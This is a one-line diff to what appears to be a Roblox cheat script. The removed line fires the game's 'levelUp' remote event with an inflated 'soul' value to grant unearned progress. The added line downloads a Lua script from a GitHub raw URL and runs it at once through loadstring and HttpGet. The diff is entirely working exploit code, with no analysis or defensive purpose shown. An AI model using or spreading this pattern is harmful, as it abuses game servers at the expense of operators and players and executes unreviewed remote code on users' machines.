@@ -1,1 +1,1 @@
-game:GetService("ReplicatedStorage").remotes.remoteEvent:FireServer("levelUp", {"soul", 11111111111111/1111111111111})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BruhSoundEffect2081/BruhScripts/main/souleaterreso.lua"))()
